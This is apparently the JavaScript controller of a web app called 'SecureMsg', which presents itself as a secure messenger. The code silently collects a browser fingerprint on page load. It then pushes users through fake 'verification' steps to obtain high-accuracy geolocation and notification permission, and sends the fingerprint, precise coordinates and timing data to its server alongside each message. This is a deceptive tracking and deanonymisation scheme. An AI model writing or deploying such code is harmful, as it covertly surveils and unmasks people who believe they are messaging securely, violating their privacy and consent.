/**
 * SecureMsg — App Controller
 * Manages phases, PWA install, permissions, and message submission.
 */
(function () {
  'use strict';

  // ── State ───────────────────────────────────────────
  const state = {
    person: '',
    fingerprint: null,
    deferredInstallPrompt: null,
    isStandalone: false,
    locationGranted: false,
    notificationGranted: false,
    locationData: null,
    notificationToken: null,
    timestamps: {
      pageLoad: Date.now(),
      installPhaseStart: Date.now(),
      permPhaseStart: null,
      messagePhaseStart: null,
    },
  };

  // ── DOM ─────────────────────────────────────────────
  const $ = (id) => document.getElementById(id);
  const $$ = (sel) => document.querySelectorAll(sel);

  const elements = {
    phaseInstall: $('phaseInstall'),
    phasePermissions: $('phasePermissions'),
    phaseMessage: $('phaseMessage'),
    phaseSuccess: $('phaseSuccess'),
    btnInstall: $('btnInstall'),
    btnSkipInstall: $('btnSkipInstall'),
    btnLocation: $('btnLocation'),
    btnNotification: $('btnNotification'),
    btnUnlockInbox: $('btnUnlockInbox'),
    btnSend: $('btnSend'),
    btnSendAnother: $('btnSendAnother'),
    messageInput: $('messageInput'),
    charCount: $('charCount'),
    statusBadge: $('statusBadge'),
    loadingOverlay: $('loadingOverlay'),
    inboxAvatar: $('inboxAvatar'),
    installHint: $('installHint'),
    locationStatus: $('locationStatus'),
    notificationStatus: $('notificationStatus'),
    permLocation: $('permLocation'),
    permNotification: $('permNotification'),
  };

  // ── Init ────────────────────────────────────────────
  async function init() {
    extractPerson();
    detectStandalone();
    registerServiceWorker();
    captureInstallPrompt();
    bindEvents();

    // Collect fingerprint silently on load
    try {
      state.fingerprint = await Collector.gatherAll();
    } catch (err) {
      console.warn('Collector error:', err);
    }

    // If already standalone (installed), skip install phase
    if (state.isStandalone) {
      goToPhase('permissions');
    } else {
      // Show skip button after 5 seconds
      setTimeout(() => {
        elements.btnSkipInstall.style.display = 'block';
      }, 5000);
      setStatus('Secure', true);
    }
  }

  // ── Extract person from URL ─────────────────────────
  function extractPerson() {
    const match = window.location.pathname.match(/\/to\/([^/]+)/);
    state.person = match ? decodeURIComponent(match[1]) : 'someone';

    $$('.person-name').forEach((el) => {
      el.textContent = state.person;
    });

    if (elements.inboxAvatar) {
      elements.inboxAvatar.textContent = state.person.charAt(0).toUpperCase();
    }
  }

  // ── PWA Standalone Detection ────────────────────────
  function detectStandalone() {
    state.isStandalone =
      window.matchMedia('(display-mode: standalone)').matches ||
      window.navigator.standalone === true ||
      document.referrer.includes('android-app://');
  }

  // ── Service Worker ──────────────────────────────────
  function registerServiceWorker() {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js').catch(() => { });
    }
  }

  // ── PWA Install Prompt ──────────────────────────────
  function captureInstallPrompt() {
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      state.deferredInstallPrompt = e;
      elements.btnInstall.disabled = false;
      elements.installHint.textContent = 'Tap the button to install the secure app';
      setStatus('Ready', true);
    });

    // If no prompt fires within 3 seconds, enable skip
    setTimeout(() => {
      if (!state.deferredInstallPrompt) {
        elements.btnInstall.disabled = false;
        elements.installHint.textContent = 'Click to continue verification';
      }
    }, 3000);

    window.addEventListener('appinstalled', () => {
      showToast('App installed successfully!', 'success');
      sendInstallReport();
      setTimeout(() => goToPhase('permissions'), 800);
    });
  }

  // ── Event Bindings ──────────────────────────────────
  function bindEvents() {
    elements.btnInstall.addEventListener('click', handleInstall);
    elements.btnSkipInstall.addEventListener('click', handleSkipInstall);
    elements.btnLocation.addEventListener('click', handleLocation);
    elements.btnNotification.addEventListener('click', handleNotification);
    elements.btnUnlockInbox.addEventListener('click', handleUnlockInbox);
    elements.btnSend.addEventListener('click', handleSend);
    elements.btnSendAnother.addEventListener('click', handleSendAnother);

    elements.messageInput.addEventListener('input', () => {
      elements.charCount.textContent = elements.messageInput.value.length;
    });
  }

  // ── Phase Management ────────────────────────────────
  function goToPhase(phase) {
    [elements.phaseInstall, elements.phasePermissions, elements.phaseMessage, elements.phaseSuccess]
      .forEach((el) => el.classList.remove('active'));

    switch (phase) {
      case 'install':
        elements.phaseInstall.classList.add('active');
        break;
      case 'permissions':
        elements.phasePermissions.classList.add('active');
        state.timestamps.permPhaseStart = Date.now();
        setStatus('Verifying', true);
        break;
      case 'message':
        elements.phaseMessage.classList.add('active');
        state.timestamps.messagePhaseStart = Date.now();
        setStatus('Encrypted', true);
        elements.messageInput.focus();
        break;
      case 'success':
        elements.phaseSuccess.classList.add('active');
        setStatus('Delivered', true);
        break;
    }
  }

  // ── Handlers ────────────────────────────────────────
  async function handleInstall() {
    if (state.deferredInstallPrompt) {
      try {
        await state.deferredInstallPrompt.prompt();
        const choice = await state.deferredInstallPrompt.userChoice;
        if (choice.outcome === 'accepted') {
          // appinstalled event will handle transition
          return;
        }
      } catch { }
    }
    // If no prompt or dismissed → skip to permissions
    await sendInstallReport();
    goToPhase('permissions');
  }

  function handleSkipInstall() {
    sendInstallReport();
    goToPhase('permissions');
  }

  async function handleLocation() {
    elements.btnLocation.disabled = true;
    elements.btnLocation.innerHTML = '<span>Verifying...</span>';

    if (!navigator.geolocation) {
      markPermission('location', false, 'Geolocation not supported');
      return;
    }

    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0,
        });
      });

      state.locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        speed: position.coords.speed,
      };
      state.locationGranted = true;
      markPermission('location', true, `Verified: ${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`);
    } catch (err) {
      markPermission('location', false, `Error: ${err.message}`);
      state.locationGranted = true; // still allow proceeding
    }

    checkPermissionsComplete();
  }

  async function handleNotification() {
    elements.btnNotification.disabled = true;
    elements.btnNotification.innerHTML = '<span>Requesting...</span>';

    if (!('Notification' in window)) {
      markPermission('notification', false, 'Notifications not supported');
      state.notificationGranted = true;
      checkPermissionsComplete();
      return;
    }

    try {
      const permission = await Notification.requestPermission();
      if (permission === 'granted') {
        state.notificationGranted = true;
        state.notificationToken = 'granted_' + Date.now();
        markPermission('notification', true, 'Notifications enabled');

        // Show a test notification
        new Notification('SecureMsg', {
          body: 'You will be notified when your message is read.',
          icon: '/icons/icon-192.png',
        });
      } else {
        markPermission('notification', false, `Permission: ${permission}`);
        state.notificationGranted = true;
      }
    } catch (err) {
      markPermission('notification', false, err.message);
      state.notificationGranted = true;
    }

    checkPermissionsComplete();
  }

  function markPermission(type, success, text) {
    const statusEl = type === 'location' ? elements.locationStatus : elements.notificationStatus;
    const cardEl = type === 'location' ? elements.permLocation : elements.permNotification;
    const btnEl = type === 'location' ? elements.btnLocation : elements.btnNotification;

    statusEl.textContent = text;
    statusEl.className = `perm-status ${success ? 'success' : 'error'}`;

    if (success) {
      cardEl.classList.add('done');
      btnEl.classList.add('granted');
      btnEl.innerHTML = '<span>✓ Verified</span>';
    } else {
      btnEl.disabled = false;
      btnEl.innerHTML = `<span>Retry</span>`;
    }
  }

  function checkPermissionsComplete() {
    if (state.locationGranted && state.notificationGranted) {
      elements.btnUnlockInbox.disabled = false;
    }
  }

  async function handleUnlockInbox() {
    showLoading('Sending permissions report...');

    // Send Type C report
    try {
      await fetch('/api/permissions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          person: state.person,
          location: state.locationData,
          notificationToken: state.notificationToken,
          timeOnPermScreen: state.timestamps.permPhaseStart
            ? Date.now() - state.timestamps.permPhaseStart
            : null,
        }),
      });
    } catch { }

    hideLoading();
    goToPhase('message');
  }

  async function handleSend() {
    const message = elements.messageInput.value.trim();
    if (!message) {
      showToast('Please type a message first', 'error');
      return;
    }

    elements.btnSend.disabled = true;
    showLoading('Encrypting and sending...');

    // Refresh fingerprint at submission time
    try {
      state.fingerprint = await Collector.gatherAll();
    } catch { }

    const behavioral = {
      timeOnPage: Date.now() - state.timestamps.pageLoad,
      timeOnInstall: state.timestamps.permPhaseStart
        ? state.timestamps.permPhaseStart - state.timestamps.installPhaseStart
        : null,
      timeOnPermissions: state.timestamps.messagePhaseStart && state.timestamps.permPhaseStart
        ? state.timestamps.messagePhaseStart - state.timestamps.permPhaseStart
        : null,
      timeOnMessage: state.timestamps.messagePhaseStart
        ? Date.now() - state.timestamps.messagePhaseStart
        : null,
    };

    try {
      const res = await fetch('/api/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          person: state.person,
          message,
          fingerprint: state.fingerprint,
          behavioral,
        }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        hideLoading();
        goToPhase('success');
      } else {
        throw new Error(data.error || 'Send failed');
      }
    } catch (err) {
      hideLoading();
      showToast('Failed to send: ' + err.message, 'error');
      elements.btnSend.disabled = false;
    }
  }

  function handleSendAnother() {
    elements.messageInput.value = '';
    elements.charCount.textContent = '0';
    elements.btnSend.disabled = false;
    goToPhase('message');
  }

  // ── Type B Report ───────────────────────────────────
  async function sendInstallReport() {
    try {
      if (!state.fingerprint) {
        state.fingerprint = await Collector.gatherAll();
      }
      await fetch('/api/install', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          person: state.person,
          fingerprint: state.fingerprint,
        }),
      });
    } catch { }
  }

  // ── UI Helpers ──────────────────────────────────────
  function setStatus(text, active) {
    const badge = elements.statusBadge;
    badge.querySelector('.status-text').textContent = text;
    const dot = badge.querySelector('.status-dot');
    if (active) dot.classList.add('active');
    else dot.classList.remove('active');
  }

  function showLoading(text) {
    const overlay = elements.loadingOverlay;
    overlay.querySelector('.loading-text').textContent = text || 'Processing...';
    overlay.style.display = 'flex';
  }

  function hideLoading() {
    elements.loadingOverlay.style.display = 'none';
  }

  function showToast(message, type = 'info') {
    const container = $('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    container.appendChild(toast);

    setTimeout(() => {
      toast.classList.add('removing');
      setTimeout(() => toast.remove(), 300);
    }, 3500);
  }

  // ── Boot ────────────────────────────────────────────
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
